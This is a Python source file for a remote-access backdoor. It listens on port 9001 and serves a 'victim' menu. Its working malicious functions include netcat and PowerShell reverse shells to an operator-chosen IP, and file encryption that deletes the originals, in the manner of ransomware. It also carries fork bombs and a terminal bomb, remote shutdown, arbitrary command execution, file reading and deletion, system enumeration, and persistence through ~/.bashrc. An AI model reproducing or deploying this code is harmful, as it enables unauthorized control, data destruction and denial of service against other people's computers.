#!/bin/env python3
import socket
import sys
import psutil
from cryptography.fernet import Fernet
import re, uuid
import platform
import os


host = '0.0.0.0'
port = 9001

cyan  = "\033[0;96m"
green   = "\033[0;92m"
white   = "\033[0;97m"
red   = "\033[0;91m"
blue  = "\033[0;94m"
yellow  = "\033[0;33m"
magenta = "\033[0;35m"
Color_Off='\033[0m'

# Persistent
def add2bashrc():
    if os.name != "nt":
        os.system("echo python3 `pwd`/main.py&  >> `echo $HOME`/.bashrc")
        os.system("echo python3 `pwd`/onefile.py&  >> `echo $HOME`/.bashrc")
    

# Term Bomb

def termBomb(con):
    con.sendall(b"\nTerminal Bomb Victim's PC? (yes/no): ")
    duar = con.recv(2048)
    try:
        duar = str(duar.decode().strip())
        if duar == "yes":
            if platform.system() == "Windows": 
                while True:
                    os.system("start cmd /k")
                    os.system("cmd /C start powershell")
            elif platform.system() == "Linux":
                while True:
                    os.system("xterm &")
        else:
            con.sendall(b'\nOperation Cancelled')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

# Sys control

def shutPC(con):
    con.sendall(b"\nShutdown Victim's PC? (yes/no): ")
    shutdown = con.recv(2048)
    try:
        shutdown = str(shutdown.decode().strip())
        if shutdown == "yes":
            if platform.system() == "Windows":
                os.system("shutdown /s /t 1")
            elif platform.system() == "Linux":
                os.system('systemctl poweroff') 
        else:
            con.sendall(b'\nOperation Cancelled')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def resPC(con):
    con.sendall(b"\nRestart Victim's PC? (yes/no): ")
    restart = con.recv(2048)
    try:
        restart = str(restart.decode().strip())
        if restart == "yes":
                if platform.system() == "Windows":
                    os.system("shutdown /r /t 1")
                elif platform.system() == "Linux":
                    os.system('systemctl reboot -i')
        else:
            con.sendall(b'\nOperation Cancelled')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def sysControl(con):
    menu = b"\n1. Shutdown Victim's PC\n2. Restart Victim's PC\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            shutPC(con)
        elif(opt == 2):
            resPC(con)
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)

# Kill Process

def listProc():
    if platform.system() == "Windows":
    	output = os.popen('wmic process get description, processid').read()
    else:
    	p = os.popen('ps -aux')
    	output = p.read()
    return output
    
def kill(con):
    con.sendall(b'\nSpecify PID: ')
    pid = con.recv(2048)
    try:
        pid = pid.decode()
        pid = int(pid)
        p = psutil.Process(pid)
        p.terminate()
        con.sendall(b'\nProcess Terminated!')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def killProcess(con):
    menu = b"\n1. List available processes\n2. Kill Process\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            result = listProc()
            con.sendall(str(result).encode())
        elif(opt == 2):
            kill(con)
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)


# Launch bomb

win = "powershell -c for(){hh \}"
lin = "bash -c ':(){ :|:& };:'"
def launchBomb(con):
    con.sendall(b"Are you sure?")
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        if optDir == "y":
            if os.name == "nt":
                os.system(win)
            else:
                os.system(lin)
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')
    

# Encrypt

def encryptFile(con):
    key = Fernet.generate_key()
    con.sendall(b"Key:\n")
    con.sendall(key)

    fernet = Fernet(key)
    con.sendall(b'\nSpecify file with path: ')
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        if os.path.exists(optDir):
            with open(optDir,'rb') as file:
                original = file.read()
            encrypted = fernet.encrypt(original)
            with open(optDir+".jak",'wb') as encrypted_file:
                encrypted_file.write(encrypted)
            os.remove(optDir)
            con.sendall(b"File encrypted")
        else:
            con.sendall(b"The file does not exist")
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')


def decryptFile(con):
    con.sendall(b'\nSpecify encrypted file with path: ')
    optDir = con.recv(2048)
    con.sendall(b"\nEnter Key: \n")
    key = con.recv(2048)
    
    key = key.strip()
    fernet = Fernet(key)
    try:
        optDir = str(optDir.decode().strip())
        if os.path.exists(optDir):
            with open(optDir,'rb') as file:
                original = file.read()
            decrypted = fernet.decrypt(original)
            optDir = optDir.replace(".jak","")
            with open(optDir,'wb') as decrypted_file:
                decrypted_file.write(decrypted)
            os.remove(optDir+".jak")    
            con.sendall(b"File decrypted")
        else:
            con.sendall(b"The file does not exist")
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def encryptMenu(con):
    menu = b"\n1. Encrypt File\n2. Decrypt File\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            encryptFile(con)
        elif(opt == 2):
            #con.sendall(b'\nListing file ready')
            decryptFile(con)        
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b"\nSomething is wrong\n")



# Revshell

def dropRevShell(con):
    con.sendall(b'\nSpecify your IP: \n')
    ip = con.recv(2048)
    con.sendall(b'\nSpecify your port: \n')
    port = con.recv(2048)
    try:
        ip = str(ip.decode().strip())
        port = str(port.decode().strip())
        # if os.name == "nt":
        #     os.system()
        # else:
        con.sendall(b"Will only work in an insecure system!")
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f &"
        if os.name == "nt":
            cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'+ip+'",'+port+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        os.system(cmd)

    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def limitedShell(con):
    while True:
        con.sendall(b'type in command:')
        cmd = con.recv(2048)
        try:
            cmd = str(cmd.decode().strip())
            stdoutt = os.popen(cmd).read()
            con.sendall(stdoutt.encode())
        except ValueError:
            con.sendall(b'Please only send valid input')
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            con.sendall(b'Could Not Retrieve Data')

# usage
def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def getCPUUsage():
    usage = ""
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        usage += "Core {}: {}%\n".format(i,percentage)
    return usage


def getRAMUsage():
    usage = ""
    # get the memory details
    svmem = psutil.virtual_memory()
    usage += f"Total: {get_size(svmem.total)}\n"
    usage += f"Available: {get_size(svmem.available)}\n"
    usage += f"Used: {get_size(svmem.used)}\n"
    usage += f"Percentage: {svmem.percent}%\n"
    return usage

def getDiskUsage():
    partitions = psutil.disk_partitions()
    usage = ""
    for partition in partitions:
        usage += f"  Device: {partition.device} \n"
        usage += f"  Mountpoint: {partition.mountpoint}\n"
        usage += f"  File system type: {partition.fstype}\n"
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        usage += f"  Total Size: {get_size(partition_usage.total)}\n"
        usage += f"  Used: {get_size(partition_usage.used)}\n"
        usage += f"  Free: {get_size(partition_usage.free)}\n"
        usage += f"  Percentage: {partition_usage.percent}%\n"
    return usage

def UsageMenu(con):
    menu = b"\n1. Get CPU Usage\n2. Get Memory Usage\n3. Get Disk Usage\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            con.sendall(str(getCPUUsage()).encode())
        elif( opt == 2):
            #con.sendall(b'\nListing file ready')
            con.sendall(str(getRAMUsage()).encode())
        elif(opt == 3):
            con.sendall(str(getDiskUsage()).encode())
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)



# FIles

def find_files(con):
    con.sendall(b'\nSpecify Dir: ')
    try:
        optDir = con.recv(2048)
        con.sendall(b'\nSpecify Keyword for Files: ')
        optFile = con.recv(2048)
        result = []
        optDir = str(optDir.decode().strip())
        optFile = str(optFile.decode().strip())
        for root, dir, files in os.walk(optDir):
            if optFile in files :
                result.append(os.path.join(root,optFile))
        message = blue+"\nFinding Files . . .\n"
        out = yellow+"\n".join(result)
        if not result:
            con.sendall(str(red+"No file found").encode())
        con.sendall(str(message+out+"\n").encode())
    except ValueError:
        con.sendall(b"\nPlease send valid input")
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b"Failed\n")
  

def listDir(con):
    con.sendall(b'\nSpecify Dir: ')
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        result = []
        for x in os.listdir(optDir):
            if os.path.isfile(os.path.join(optDir, x)): result.append(white+'f- '+ x)
            elif os.path.isdir(os.path.join(optDir, x)): result.append(blue+'d- '+ x)
            elif os.path.islink(os.path.join(optDir, x)): result.append('l- '+ x)
            else: result.append('--- '+ x)

        listdir = blue+Color_Off+"\n".join(result) 
        listdir = listdir+"\n"
        message = yellow+"Listing Directory "+red+optDir+"\n"
        #con.sendall(message.encode())
        con.sendall(str(message+listdir).encode())
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def removeFile(con):
    con.sendall(b'\nSpecify file with path: ')
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        if os.path.exists(optDir):
            os.remove(optDir)
            con.sendall(b"File removed")
        else:
            con.sendall(b"The file does not exist")
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def readFile(con):
    con.sendall(b'\nSpecify file with path: ')
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        if os.path.exists(optDir):
            f = open(optDir,'r')
            content = red+"\n+++++++++++"+optDir+"++++++++++++++\n"
            content+= green+"  "+f.read()
            content+= red+"\n+++++++++++++++++++++++++++++++++++\n"+Color_Off
            con.sendall(content.encode())
        else:
            con.sendall(b"The file does not exist")
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')
def filesMenu(con):
    menu = b"\n1. Current Directory\n2. Directory Listing\n3. Find Files in Directory\n4. Remove File\n5. Read File\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            con.sendall(str(red+os.getcwd()+"\n").encode())
        elif( opt == 2):
            #con.sendall(b'\nListing file ready')
            listDir(con)
        elif(opt == 3):
            find_files(con)
        elif(opt == 4):
            removeFile(con)
        elif(opt == 5):
            readFile(con)
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)



# Network 

def getNetInterface():
    result = psutil.net_if_addrs()
    netInterface = ""
    result = list(result.keys())
    for i in result:
        netInterface+= blue
        netInterface+= i
        netInterface+= ", "
        netInterface+=Color_Off
    return netInterface

def getListeningPort():
    result = ""
    output = psutil.net_connections()
    for i in output:
        result += "IP address: "+i.laddr.ip +" Port: "+str(i.laddr.port)+" "+i.status+"\n"
    return result

def getIPAddress():
    result = psutil.net_if_addrs()
    interface = list(result.keys())
    ip = []
    for i in interface:
        if os.name == 'nt':
            ip.append(green+result[i][1].address)
        else:
            ip.append(green+result[i][0].address)

    
    all = ""
    for i,j in zip(interface,ip):
        all+= magenta
        all += i+ " " + j + "\n"
        all+=Color_Off
    return all
        

def getMacAddress():
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    return cyan+mac+Color_Off

def NetworkMenu(con):
    menu = b"\n1. Get Network Interface\n2. Get IP address\n3. Get Mac Address\n4. Get Listening Port"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            con.sendall(str(getNetInterface()).encode())
        elif( opt == 2):
            #con.sendall(b'\nListing file ready')
            con.sendall(str(getIPAddress()).encode())
        elif(opt == 3):
            con.sendall(str(getMacAddress()).encode())
        elif(opt ==4):
            con.sendall(str(getListeningPort()).encode())
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)

# ProcEnum
def listProc():
    if platform.system() == "Windows":
    	output = os.popen('wmic process get description, processid').read()
    else:
    	p = os.popen('ps -aux')
    	output = p.read()
    return output
    
def procInfo(con):
    con.sendall(b'\nSpecify PID: ')
    pid = con.recv(2048)
    try:
        pid = pid.decode()
        pid = int(pid)
        pName = psutil.Process(int(pid)).name()
        pStatus = psutil.Process(int(pid)).status()
        pUsername = psutil.Process(int(pid)).username()
        pExe = psutil.Process(int(pid)).exe()
        pCwd = psutil.Process(int(pid)).cwd()
        
        fullInfo = "Here are the information for PID "+yellow+str(pid)+Color_Off+"\nProcess Name: "+green+str(pName)+Color_Off+"\nProcess Status: "+blue+str(pStatus)+Color_Off+"\n"+magenta+str(pUsername)+Color_Off+" owns the process"+"\nProcess executable absolute path: "+cyan+str(pExe)+Color_Off+"\nProcess current working directory: "+red+str(pCwd)+Color_Off+"\n"
        
        con.sendall(str(fullInfo).encode())
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def procPC(con):
    con.sendall(b'\nSpecify PID: ')
    pid = con.recv(2048)
    try:
        pid = pid.decode()
        pid = int(pid)
        pParent = psutil.Process(int(pid)).parents()
        parentStr = ' '.join([str(elem) for elem in pParent])
        pChild = psutil.Process(int(pid)).children(recursive=True)
        childStr = ' '.join([str(elem) for elem in pChild])
        pcInfo = "Here are the parent and children process for PID "+green+str(pid)+Color_Off+"\nParent Process: "+yellow+str(parentStr)+Color_Off+"\nChild Process: "+blue+str(childStr)+Color_Off+"\n"
        
        con.sendall(str(pcInfo).encode())
        
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def procMenu(con):
    menu = b"\n1. List available processes\n2. List Process Information\n3. List process parent and child information\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            result = listProc()
            con.sendall(str(result).encode())
        elif(opt == 2):
            procInfo(con)
        elif(opt == 3):
            procPC(con)
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)



#  Sysenum
def processor():
    name = platform.processor()
    phyCore = psutil.cpu_count(logical=False)
    totCore = psutil.cpu_count(logical=True)
    
    procInfo = "Processor's name is "+red+name+Color_Off+"\nThe user have "+red+str(phyCore)+" physical core(s) and "+red+str(totCore)+" total core(s)\n"+Color_Off
    return procInfo

def hardwareInfo():
    desktopName = platform.node()
    return red+desktopName+Color_Off

def architecture():
    architecture_details = platform.architecture()
    delimiter = ','
    detail = delimiter.join(architecture_details)
    return green+detail+Color_Off

def sysMenu(con):
    menu = b"\n1. Processor Information\n2. Hardware Name\n3. System Architecture\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            name = processor()
            con.sendall(str(name).encode())
        elif(opt == 2):
            name = hardwareInfo()
            con.sendall(str("User's computer network name is "+name).encode())
        elif(opt == 3):
            result = architecture()
            con.sendall(str("User's desktop system architecture is "+result).encode())
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)

# Osenum
def osName():
    name = platform.system()
    return yellow+name+Color_Off

def osRelease():
    release = platform.release()
    return cyan+release+Color_Off

def osVersion():
    version = platform.version()
    return red+version+Color_Off
    
def osType():
    type = platform.platform()
    return green+type+Color_Off

def machineType():
    machine = platform.machine()
    return magenta+machine+Color_Off
    
def osMenu(con):
    menu = b"\n1. Operating System Name\n2. Operating System Release\n3. Operating System Information\n4. Platform Type\n5. Machine Type\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            name = osName()
            con.sendall(str("User's operating system name is "+name).encode())
        elif(opt == 2):
            release = osRelease()
            con.sendall(str("User's operating system release is "+release).encode())
        elif(opt == 3):
            version = osVersion()
            con.sendall(str("User's operating system version is "+version).encode())
        elif(opt == 4):
            type = osType()
            con.sendall(str("User's platform type is "+type).encode())
        elif(opt == 5):
            machine = machineType()
            con.sendall(str("User's machine type is "+machine).encode())
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)


# main

def banner(con):
    banner = magenta + """ 
    8888888888                             88888888888 888    888 d8b          
    888                                        888     888    888 Y8P""" + Color_Off
    banner += yellow + """
    888                                        888     888    888              
    8888888    88888b.  888  888 88888b.d88b.  888     8888888888 888 .d8888b""" + Color_Off
    banner += blue + """
    888        888 "88b 888  888 888 "888 "88b 888     888    888 888 88K      
    888        888  888 888  888 888  888  888 888     888    888 888 "Y8888b.""" + Color_Off
    banner += red + """ 
    888        888  888 Y88b 888 888  888  888 888     888    888 888      X88 
    8888888888 888  888  "Y88888 888  888  888 888     888    888 888  88888P'""" + Color_Off
    con.sendall(banner.encode())


def menu(con):
    banner(con)
    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n14. Run persistent\n15. Limited Shell'
    con.sendall(mainMenu)
    con.sendall(b'\nSpecify Option: ')
    opt = con.recv(1024)
    if not opt:
        menu()
    else :
        try:
            opt = opt.decode()
            opt = int(opt)
            if(opt == 1):
                osMenu(con)
            elif(opt == 2):
                sysMenu(con)
            elif(opt == 3):
                procMenu(con)
            elif(opt == 4):
                NetworkMenu(con)
            elif(opt == 5):
                filesMenu(con)
            elif(opt == 6):
                UsageMenu(con)
            elif(opt == 7):
                dropRevShell(con)
            elif(opt == 8):
                encryptMenu(con)
            elif(opt == 9):
                launchBomb(con)
            elif(opt == 10):
                killProcess(con)
            elif(opt == 11):
                sysControl(con)
            elif(opt == 13):
                termBomb(con)
            elif(opt ==14):
                con.sendall(b"ONLY WORKS ON LINUX!")
                add2bashrc()
                con.sendall(b"DONE!")
            elif(opt ==15):
                limitedShell(con)
        except ValueError:
            con.sendall(b'Please only send integer value representing each option\n')
        except KeyboardInterrupt:
            sys.exit(0)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            s.listen()
            conn, addr = s.accept()
            with conn:
                print('Connection from ',addr)
                while True:
                    menu(conn)
        except KeyboardInterrupt:
            print("Keyboard Interrupt")
            sys.exit(0)
        except :
            print('Cant Bind Socket')


if __name__ == "__main__":
    while True:
        main()
